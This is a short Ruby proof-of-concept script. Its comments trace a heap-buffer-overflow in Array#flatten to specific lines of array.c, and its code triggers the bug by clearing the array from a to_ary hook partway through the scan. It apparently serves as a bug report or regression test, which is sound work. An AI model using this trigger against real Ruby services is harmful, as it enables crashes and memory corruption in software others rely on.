# Array#flatten: to_ary during the scan (rb_check_array_type, array.c:6705) clears the
# array, shrinking its heap buffer; ary_memcpy(result,0,i,...) at array.c:6715 then copies
# the stale count `i` of elements from the reallocated (smaller) buffer -> heap-buffer-overflow.
a = (1..2000).to_a
bad = Object.new
$a = a
def bad.to_ary; $a.clear; [1,2,3]; end
a << bad          # bad at index 2000, so scan sets i=2000 before clear
a.flatten
